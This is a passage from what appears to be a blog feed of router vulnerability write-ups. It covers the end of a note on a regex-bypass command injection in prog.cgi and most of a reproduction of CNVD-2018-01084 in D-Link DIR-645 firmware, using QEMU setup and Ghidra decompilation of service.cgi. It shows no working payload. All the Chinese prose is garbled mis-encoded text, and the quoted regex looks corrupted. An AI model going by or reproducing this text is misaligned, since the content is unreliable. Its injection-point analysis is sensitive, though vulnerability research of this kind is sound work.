<p>ä½†æ˜¯è¿™ä¸ªåŠŸèƒ½çš„åç«¯å®ç°ä½¿ç”¨äº† execv å‡½æ•°ï¼Œå¹¶ä¸”å¯¹äºç”¨æˆ·ä¼ å…¥çš„ URL æ£€éªŒä¸ä¸¥æ ¼ï¼Œå¯¼è‡´æ¶æ„ç”¨æˆ·å¯ä»¥æ‹¼æ¥ä»»æ„å‘½ä»¤åˆ° execv å‡½æ•°ä¸­æ‰§è¡Œï¼Œä¸¥é‡çš„å¯¼è‡´å¯ä»¥è·å–è·¯ç”±å™¨çš„äº¤äº’å¼ shellã€‚</p>
<p>æ¼æ´ä¾ç„¶å‡ºç°åœ¨ prog.cgi ä¸­ï¼Œåœ¨ SetWebFilterSettings æ¥å£ç»‘å®šå‡½æ•°ä¸­å¯¹äº URL è°ƒç”¨äº† tbsCheckHttpUrl å‡½æ•°è¿›è¡Œè¿‡æ»¤(åœ¨ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ä¸å­˜åœ¨è¿‡æ»¤)ï¼Œè¿™ä¸ªå‡½æ•°ä½äº librcm.so ä¸­ã€‚</p>
<p>åˆ©ç”¨ IDA æ‰“å¼€ so æ–‡ä»¶å¯ä»¥å®šä½åˆ°æ­¤å‡½æ•°ï¼ˆghidra ä¸çŸ¥é“é—®ä»€ä¹ˆæ— æ³•è§£æåˆ°è¿™ä¸ªå‡½æ•°ï¼‰ï¼Œå†…éƒ¨å®ç°æµç¨‹å¤§è‡´æ˜¯åˆ©ç”¨ä¸€æ®µæ­£åˆ™è¡¨è¾¾å¼å»åŒ¹é…è¾“å…¥çš„ URLï¼Œå¦‚æœåŒ¹é…å¤±è´¥å°±æ‹’ç»æ­¤ URLï¼Œæ¶‰åŠçš„<strong>éƒ¨åˆ†</strong>æ­£åˆ™å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">^(http://)?(([0-9a-zA-Z_!~*&#x27;(*a-zA-Z_!~*&#x27;().&amp;=+$%-]+@)?(([0-9]&#123;1,3&#125;\.)*&#123;1,4&#125;)|(:6*0-4][0-9]&#123;2&#125;)|(:655[0-2][0-9])|(:6553[0-5]))?((/?)|(/[0-9a-zA-Z_!~*&#x27;().;?:@&amp;=+$,%#-]+)+/?)$</span><br></pre></td></tr></table></figure></div>

<p>è™½ç„¶æ­£åˆ™è¿‡æ»¤æ‰äº†ä¸€éƒ¨åˆ†å±é™©è¾“å…¥(ä¸»è¦æ˜¯ç©ºæ ¼ç¬¦)ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¤šç§åŠæ³•æ¥ç»•è¿‡ç©ºæ ¼ç¬¦çš„è¿‡æ»¤ï¼Œç”±äºè¿™ä¸ª API æ¥å£é™¤äº† tbsCheckHttpUrl å¤„ç† URL ä¹‹å¤–å°±æ²¡æœ‰å…¶ä»–é˜²æŠ¤äº†ï¼Œç»•è¿‡è¿‡æ»¤ä¹‹åä¾ç„¶å¯æ‰§è¡Œä»»æ„ shell å‘½ä»¤ã€‚</p>
<p>æ‹¿åˆ°äº¤äº’å¼çš„ shell ä¹‹åå³å¯ä¸Šä¼ ä¸€ä»½è°ƒè¯•å™¨ï¼Œå†å»è°ƒè¯•å›ºä»¶å°±æ–¹ä¾¿å¤šäº†ã€‚</p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
  </entry>
  <entry>
    <title>CNVD-2018-01084 æ¼æ´å¤ç°</title>
    <url>/2019/09/05/CNVD-2018-01084/</url>
    <content><![CDATA[<p>CNVD-2018-01084 æ˜¯ Dlink ç³»åˆ—è·¯ç”±å™¨çš„ä¸€ä¸ªæ¼æ´ï¼Œå½±å“è®¾å¤‡åŒ…æ‹¬ DIR 615&#x2F;645&#x2F;815 è·¯ç”±å™¨ã€‚</p>
<p>æ¼æ´å­˜åœ¨äº &#x2F;htdocs&#x2F;cgibin äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œæ¼æ´æˆå› æ˜¯ service.cgi ä¸­æœªç»ä»»ä½•è¿‡æ»¤æ£€æŸ¥å°±å°†ç”¨æˆ·çš„è¾“å…¥æ‹¼æ¥åˆ°åŸå§‹å‘½ä»¤ä¸­ï¼Œå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<span id="more"></span>



<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>é¦–å…ˆä¸‹è½½å­˜åœ¨æ¼æ´çš„å›ºä»¶ï¼Œåœ°å€ <a class="link"   href="ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/" >ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æˆ‘ä¸‹è½½çš„æ˜¯ 1.02 ç‰ˆæœ¬ï¼Œè¿™ä¸ªæ¼æ´åœ¨ 1.03 ä»¥ä¸Šç‰ˆæœ¬è¢«ä¿®å¤äº†ï¼Œæ³¨æ„ä¸è¦ä¸‹é”™ã€‚</p>
<p>å›ºä»¶ä¸º MIPS æ¶æ„ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨ QEMU æ¥æ¨¡æ‹Ÿæ‰§è¡Œï¼Œå…³äº QEMU å’Œç¯å¢ƒçš„å…·ä½“æ­å»ºæµç¨‹å¯ä»¥å‚è€ƒæˆ‘ä¸Šä¸€ç¯‡æ–‡ç«  <a href="https://wzt.ac.cn/2019/03/19/CVE-2018-5767/">https://wzt.ac.cn/2019/03/19/CVE-2018-5767/</a></p>
<p>è¿™ä¸ªå›ºä»¶å±äº CGI(é€šç”¨ç½‘å…³æ¥å£)ï¼Œæ‰€ä»¥ä¸éœ€è¦æ­å»ºç½‘ç»œç¯å¢ƒå³å¯è¿è¡Œã€‚</p>
<p>è£…å¥½å¿…è¦çš„è½¯ä»¶ä¹‹åä½¿ç”¨å‘½ä»¤</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu -g 10000 ./htdocs/cgibin</span><br></pre></td></tr></table></figure></div>

<p>å³å¯è¿è¡Œç¨‹åºï¼Œå¦‚æœæ·»åŠ äº† -g é€‰é¡¹ï¼Œé‚£ä¹ˆåœ¨å¤–éƒ¨ä½¿ç”¨ gdb é“¾æ¥åˆ° 10000 ç«¯å£å°±èƒ½è°ƒè¯•ç¨‹åºäº†ã€‚</p>
<p>è¿è¡Œèµ·æ¥ä¼šæç¤º</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGI.BIN, unknown command cgibin</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ˜¯æ­£å¸¸ç°è±¡ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è®¿é—®ä»»ä½• CGI æœåŠ¡ã€‚</p>
<h2 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h2><p>ç”±äºæ˜¯ MIPS ç¨‹åºï¼ŒIDA çš„åç¼–è¯‘æ’ä»¶ä¸èƒ½è§£æä¼ªä»£ç ï¼Œåœ¨ä¹‹å‰æˆ‘ä»¬åªèƒ½ç¡¬ç€å¤´çš®çœ‹æ±‡ç¼–ï¼Œæˆ–è€…åˆ©ç”¨ RETDEC å¤§æ¦‚çœ‹çœ‹å‡½æ•°è°ƒç”¨å…³ç³»ï¼Œä½†æ˜¯ä»Šå¹´ä¸ŠåŠå¹´ NSA å‘å¸ƒäº† Ghidraï¼Œç›¸ä¿¡å¤§å®¶éƒ½æœ‰æ‰€è€³é—»ï¼Œåˆ°ç°åœ¨å·²ç»è¿­ä»£äº† 5 ä¸ªç‰ˆæœ¬ï¼Œåœ¨ GITHUB ä¸Šå¯ä»¥ä¸‹è½½åˆ°æœ€æ–°çš„ 9.0.4 ç‰ˆæœ¬æºä»£ç ã€‚</p>
<p>å¦‚æœä¸æƒ³æ‰‹åŠ¨ç¼–è¯‘çš„å¯ä»¥ç›´æ¥å»å®˜æ–¹ç½‘ç«™ä¸‹è½½ release ç‰ˆæœ¬ã€‚</p>
<p>Ghidra è™½ç„¶é€Ÿåº¦å’Œäº¤äº’æ€§å¼±äº IDAï¼Œä½†æ˜¯å®ƒèƒ½åç¼–è¯‘ mips ç­‰ IDA æš‚ä¸æ”¯æŒçš„æ¶æ„ï¼Œè¿™æ¬¡æˆ‘ä»¬å°±åˆ©ç”¨å®ƒæ¥å®Œæˆé€†å‘åˆ†æã€‚</p>
<p>æ‰“å¼€ Ghidra æ–°å»ºé¡¹ç›®ï¼Œå¹¶å¯¼å…¥ cgibin æ–‡ä»¶ï¼Œè®© ghidra è‡ªåŠ¨åˆ†æï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-1.png"
                     
                ></p>
<p>åœ¨å·¦è¾¹çš„å‡½æ•°çª—å£ä¸­æœ‰ä¸€ä¸ªæœç´¢æ ï¼Œæœç´¢ main å³å¯æ‰¾åˆ° main å‡½æ•°ï¼Œç‚¹å‡»æ±‡ç¼–çª—å£ï¼Œå³ä¾§çš„åç¼–è¯‘çª—å£å°±è‡ªåŠ¨å‡ºç°çš„ main å‡½æ•°çš„ä¼ªä»£ç ï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/CNVD-2018-01084-2.png"
                     
                ></p>
<p>åç¼–è¯‘çš„æ•ˆæœæ„Ÿè§‰å’Œ IDA çš„ä¸ç›¸ä¸Šä¸‹ï¼Œåªæ˜¯äº¤äº’æ€§å’Œç»†èŠ‚ä¸Šå·®ä¸€äº›ã€‚</p>
<p>æ ¹æ®æŠ«éœ²ä¿¡æ¯ï¼Œæ¼æ´ä½äº service.cgi ä¸­ï¼Œåœ¨ main å‡½æ•°æ‰¾ä¸€æ‰¾å°±èƒ½æ‰¾åˆ°è¿™ä¸€é¡¹ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  iVar2 = <span class="built_in">strcmp</span>(__s,<span class="string">&quot;pigwidgeon.cgi&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">    UNRECOVERED_JUMPTABLE = pigwidgeoncgi_main;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar2 = <span class="built_in">strcmp</span>(__s,<span class="string">&quot;service.cgi&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">      UNRECOVERED_JUMPTABLE = servicecgi_main;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>è§‚å¯Ÿä»£ç å‘ç° cgibin ä» web ç«¯æ¥å—äº†è¯·æ±‚ï¼Œç„¶åå–å‡º URL ä¸­çš„è®¿é—®å‚æ•°ï¼Œç­›é€‰å‡ºå¯¹åº”çš„ cgi æœåŠ¡ï¼Œå¹¶è°ƒç”¨ç›¸å…³å‡½æ•°ã€‚</p>
<p>Service.cgi å¯¹åº”çš„æ˜¯ servicecgi_main å‡½æ•°ï¼Œä¼ªä»£ç ï¼š</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">servicecgi_main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined *__ptr;</span><br><span class="line">  <span class="type">char</span> *__s1;</span><br><span class="line">  <span class="type">int</span> *piVar1;</span><br><span class="line">  <span class="type">int</span> iVar2;</span><br><span class="line">  <span class="type">void</span> *__ptr_00;</span><br><span class="line">  uint uVar3;</span><br><span class="line">  <span class="type">char</span> *__format;</span><br><span class="line">  <span class="type">int</span> iVar4;</span><br><span class="line">  <span class="type">char</span> acStack280 [<span class="number">260</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(acStack280,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">  __s1 = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (__s1 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    __s1 = <span class="string">&quot;No HTTP request&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> LAB_0040ab48;</span><br><span class="line">  &#125;</span><br><span class="line">  iVar4 = strcasecmp(__s1,<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar3 = <span class="number">0x400</span>;</span><br><span class="line">LAB_0040aad0:</span><br><span class="line">    iVar4 = cgibin_parse_request(FUN_0040adcc,<span class="number">0</span>,uVar3);</span><br><span class="line">    <span class="keyword">if</span> (iVar4 &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      __s1 = <span class="string">&quot;Unable to parse HTTP request&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      iVar4 = sess_ispoweruser();</span><br><span class="line">      <span class="keyword">if</span> (iVar4 != <span class="number">0</span>) &#123;</span><br><span class="line">         iVar2 = FUN_0040a950(<span class="string">&quot;EVENT&quot;</span>);</span><br><span class="line">         __s1 = (<span class="type">char</span> *)FUN_0040a950(<span class="string">&quot;ACTION&quot;</span>);</span><br><span class="line">         iVar4 = FUN_0040a950(<span class="string">&quot;SERVICE&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">if</span> ((iVar4 != <span class="number">0</span>) &amp;&amp; (__s1 != (<span class="type">char</span> *)<span class="number">0x0</span>)) &#123;</span><br><span class="line">             iVar2 = strcasecmp(__s1,<span class="string">&quot;START&quot;</span>);</span><br><span class="line">             <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">                __s1 = <span class="string">&quot;service %s start &gt; /dev/null&quot;</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">else</span> &#123;</span><br><span class="line">                iVar2 = strcasecmp(__s1,<span class="string">&quot;STOP&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (iVar2 == <span class="number">0</span>) &#123;</span><br><span class="line">                  __s1 = <span class="string">&quot;service %s stop &gt; /dev/null&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                  iVar2 = strcasecmp(__s1,<span class="string">&quot;RESTART&quot;</span>);</span><br><span class="line">                  <span class="keyword">if</span> (iVar2 != <span class="number">0</span>) &#123;</span><br><span class="line">                    __format = <span class="string">&quot;Unknown action - \&#x27;%s\&#x27;&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> LAB_0040ab00;</span><br><span class="line">                  &#125;</span><br><span class="line">                  __s1 = <span class="string">&quot;service %s restart &gt; /dev/null&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">goto</span> LAB_0040ac38;</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> &#123;</span><br><span class="line">           __s1 = <span class="string">&quot;event %s &gt; /dev/null&quot;</span>;</span><br><span class="line">           iVar4 = iVar2;</span><br><span class="line">LAB_0040ac38:</span><br><span class="line">           lxmldbc_system(__s1,iVar4);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="built_in">memset</span>(acStack280,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">         iVar4 = <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">goto</span> LAB_0040ac7c;</span><br><span class="line">      &#125;</span><br><span class="line">      __s1 = <span class="string">&quot;Not authorized&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LAB_0040ab48:</span><br><span class="line">    <span class="built_in">snprintf</span>(acStack280,<span class="number">0x100</span>,__s1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    iVar4 = strcasecmp(__s1,<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (iVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">      uVar3 = <span class="number">0x40</span>;</span><br><span class="line">      <span class="keyword">goto</span> LAB_0040aad0;</span><br><span class="line">    &#125;</span><br><span class="line">    __format = <span class="string">&quot;Unsupport HTTP request - %s&quot;</span>;</span><br><span class="line">LAB_0040ab00:</span><br><span class="line">    <span class="built_in">snprintf</span>(acStack280,<span class="number">0x100</span>,__format,__s1);</span><br><span class="line">  &#125;</span><br><span class="line">  iVar4 = <span class="number">-1</span>;</span><br><span class="line">LAB_0040ac7c:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/xml\r\n\r&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;utf-8\&quot;?&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;report&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (iVar4 == <span class="number">0</span>) &#123;</span><br><span class="line">    __s1 = <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    __s1 = <span class="string">&quot;FAILED&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t&lt;result&gt;%s&lt;/result&gt;\n&quot;</span>,__s1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t&lt;message&gt;%s&lt;/message&gt;\n&quot;</span>,acStack280);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;&lt;/report&gt;&quot;</span>);</span><br><span class="line">  cgibin_clean_tempfiles();</span><br><span class="line">  <span class="keyword">while</span> (__ptr = PTR_LOOP_00420120, (undefined **)PTR_LOOP_00420120 != &amp;PTR_LOOP_00420120) &#123;</span><br><span class="line">    piVar1 = *(<span class="type">int</span> **)(PTR_LOOP_00420120 + <span class="number">4</span>);</span><br><span class="line">    iVar2 = *(<span class="type">int</span> *)PTR_LOOP_00420120;</span><br><span class="line">    __ptr_00 = *(<span class="type">void</span> **)(PTR_LOOP_00420120 + <span class="number">8</span>);</span><br><span class="line">    *piVar1 = iVar2;</span><br><span class="line">    *(<span class="type">int</span> **)(iVar2 + <span class="number">4</span>) = piVar1;</span><br><span class="line">    *(undefined4 *)__ptr = <span class="number">0</span>;</span><br><span class="line">    *(undefined4 *)(__ptr + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (__ptr_00 != (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(__ptr_00);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">void</span> **)(__ptr + <span class="number">0xc</span>) != (<span class="type">void</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(__ptr + <span class="number">0xc</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(__ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> iVar4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>ç¨å¾®è§‚å¯Ÿä¸€ä¸‹å‘ç°å‡½æ•°å†…éƒ¨å…ˆå¤„ç†ä¼ é€’è¿›æ¥çš„ HTTP è¯·æ±‚ï¼Œä½†æ˜¯è¿™é‡Œçš„è¯·æ±‚å¤„ç†æµç¨‹å¾ˆå¥‡æ€ªï¼Œåˆ©ç”¨ getenv å‡½æ•°ä»ç³»ç»Ÿç¯å¢ƒå˜é‡ä¸­è·å–è¯·æ±‚å­—æ®µã€‚</p>
<p>æŸ¥æ‰¾æ–‡ä»¶å†…å®¹ä¹‹åå‘ç°äº†è°ƒç”¨ cgi çš„æ–‡ä»¶ï¼Œä½¿ç”¨å‘½ä»¤åœ¨ htdocs ç›®å½•æŸ¥æ‰¾æ‰€æœ‰åŒ…å« cgi å­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -rn &quot;cgi&quot; *</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°è¾“å‡ºï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">åŒ¹é…åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ cgibin</span><br><span class="line">web/js/comm.js:393:	ajaxObj.sendRequest(&quot;hedwig.cgi&quot;, xml.XDoc);</span><br><span class="line">web/js/comm.js:396:/* submit the action type to pigwidgeon.cgi for caching(saving) config or restarting service */</span><br><span class="line">web/js/comm.js:409:	ajaxObj.sendRequest(&quot;pigwidgeon.cgi&quot;, payload);</span><br><span class="line">web/js/postxml.js:44:		AJAX.sendRequest(&quot;captcha.cgi&quot;, &quot;DUMMY=YES&quot;);</span><br><span class="line">web/js/postxml.js:73:		AJAX.sendRequest(&quot;session.cgi&quot;, payload);</span><br><span class="line">web/js/postxml.js:89:		AJAX.sendRequest(&quot;session.cgi&quot;, payload);</span><br><span class="line">webinc/js/wiz_wan_fresetv6.php:859:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/bsc_sms_inbox.php:123:        ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/adv_qos.php:627:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/tools_system.php:67:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/tools_time.php:318:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;SERVICE=DEVICE.TIME&amp;ACTION=RESTART&quot;);</span><br><span class="line">webinc/js/tools_time.php:360:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;SERVICE=DEVICE.TIME&amp;ACTION=RESTART&quot;);</span><br><span class="line">webinc/js/adv_wps.php:230:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/tools_sys_ulcfg.php:67:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/st_ipv6.php:17:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+EventName);</span><br><span class="line">webinc/js/tools_firmware.php:39:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=CHECKFW&quot;);</span><br><span class="line">webinc/js/tools_email.php:153:        ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=SENDMAIL&quot;);</span><br><span class="line">webinc/js/st_device.php:17:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+EventName);</span><br><span class="line">webinc/js/wiz_freset.php:1103:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/adv_dlna.php:179:		ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+EventName);</span><br><span class="line">webinc/js/adv_routingv6.php:173:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/js/bsc_lan.php:1027:	ajaxObj.sendRequest(&quot;service.cgi&quot;, &quot;EVENT=&quot;+svc);</span><br><span class="line">webinc/body/tools_system.php:8:	&lt;form id=&quot;dlcfgbin&quot; action=&quot;dlcfg.cgi&quot; method=&quot;post&quot;&gt;</span><br><span class="line">webinc/body/tools_system.php:18:	&lt;form id=&quot;ulcfgbin&quot; action=&quot;seama.cgi&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">webinc/body/tools_firmware.php:63:&lt;form id=&quot;fwup&quot; action=&quot;fwup.cgi&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br></pre></td></tr></table></figure></div>

<p>åŸºæœ¬éƒ½æ˜¯åœ¨ js ä¸­è°ƒç”¨çš„ service.cgiï¼Œä¾‹å¦‚ tools_system.phpï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">ajaxObj.<span class="title function_ invoke__">createRequest</span>();</span><br><span class="line">	ajaxObj.onCallback = <span class="function"><span class="keyword">function</span> (<span class="params">xml</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		ajaxObj.<span class="title function_ invoke__">release</span>();</span><br><span class="line">		<span class="keyword">if</span> (xml.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;/report/result&quot;</span>)!=<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">			BODY.<span class="title function_ invoke__">ShowAlert</span>(<span class="string">&quot;Internal ERROR!\nEVENT &quot;</span>+svc+<span class="string">&quot;: &quot;</span>+xml.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;/report/message&quot;</span>));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			BODY.<span class="title function_ invoke__">ShowCountdown</span>(banner, msgArray, sec, url);</span><br><span class="line">	&#125;</span><br><span class="line">	ajaxObj.<span class="title function_ invoke__">setHeader</span>(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">	ajaxObj.<span class="title function_ invoke__">sendRequest</span>(<span class="string">&quot;service.cgi&quot;</span>, <span class="string">&quot;EVENT=&quot;</span>+svc);</span><br></pre></td></tr></table></figure></div>

<p>ç±»ä¼¼çš„è¿˜æœ‰å¾ˆå¤šï¼Œweb ç«¯é€šè¿‡ js æ„é€ è¯·æ±‚ï¼Œå¹¶å°†è¯·æ±‚å‘é€åˆ° cgibin è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ã€‚</p>
<p>å›åˆ°ä»£ç ä¸Šï¼Œé¦–å…ˆè·å–äº† REQUEST_METHOD å­—æ®µï¼Œåˆ¤æ–­æ˜¯å¦ä¸º POSTï¼Œç„¶åè¿›å…¥ cgibin_parse_request å‡½æ•°è¿›ä¸€æ­¥è§£æ HTTP è¯·æ±‚ã€‚</p>
<p>cgibin_parse_request å‡½æ•°ä¸­æ„é€ äº† sobj ç»“æ„ä½“ï¼Œå‡½æ•°å¤§è‡´åŠŸèƒ½æ˜¯å–å‡º CONTENT_TYPEã€CONTENT_LENGTHã€REQUEST_URI è¿™å‡ ä¸ªè¯·æ±‚å­—æ®µï¼Œè¿›è¡Œè¿›ä¸€æ­¥æ“ä½œã€‚</p>
<p>å…³é”®ç‚¹åœ¨äº REQUEST_URIï¼Œå®ƒè¡¨ç¤ºäº†å½“å‰è¯·æ±‚çš„è®¿é—®å‚æ•°ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">__nptr_00 = getenv(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__nptr_00 == (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">  iVar4 = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">/* get &#x27;?&#x27; */</span></span><br><span class="line">  __nptr_00 = <span class="built_in">strchr</span>(__nptr_00,<span class="number">0x3f</span>);</span><br><span class="line">  iVar4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (__nptr_00 != (<span class="type">char</span> *)<span class="number">0x0</span>) &#123;</span><br><span class="line">     local_38 = <span class="number">0</span>;</span><br><span class="line">     sVar2 = <span class="built_in">strlen</span>(__nptr_00 + <span class="number">1</span>);</span><br><span class="line">     FUN_00402dc0(&amp;local_38,(<span class="type">int</span>)(__nptr_00 + <span class="number">1</span>),sVar2);</span><br><span class="line">     FUN_00402dc0(&amp;local_38,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">     iVar4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä» REQUEST_URI ä¸­å®šä½ ? ï¼Œç„¶åå–å‡ºé—®å·ä¹‹åçš„å†…å®¹ï¼Œè®¡ç®—é•¿åº¦ã€‚</p>
<p>å‡½æ•° FUN_00402dc0 çš„ä¸»è¦åŠŸèƒ½æ˜¯å¯¹å–å‡ºçš„å‚æ•°è¿›è¡Œ URLdecodeï¼Œå¹¶å†™å…¥æŸå—å†…å­˜åŒºåŸŸã€‚</p>
